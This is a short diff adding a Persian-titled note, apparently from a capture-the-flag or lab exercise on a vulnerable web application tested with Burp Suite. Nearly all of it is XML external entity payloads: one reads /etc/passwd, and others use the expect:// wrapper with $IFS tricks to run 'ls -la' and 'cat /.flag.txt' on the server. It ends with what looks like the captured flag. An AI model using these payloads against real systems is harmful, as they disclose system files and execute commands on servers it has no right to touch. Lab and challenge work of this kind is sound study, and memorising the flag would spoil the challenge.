@@ -1,0 +1,18 @@
+
+وب اپلیکیش آسیب پذیر- عدم اعتبارسنجی ورودی 
+
+توسط Burp Suite
+
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "/etc/passwd" >]>
+
+<!ENTITY xxe SYSTEM "expect://ls$IFS-la" >]>
+
+<!ENTITY xxe SYSTEM "expect://ls$IFS-la$IFS/" >]>
+
+
+<!ENTITY xxe SYSTEM "expect://cat$IFS/.flag.txt" >]>
+
+
+xxeisgoodvuln
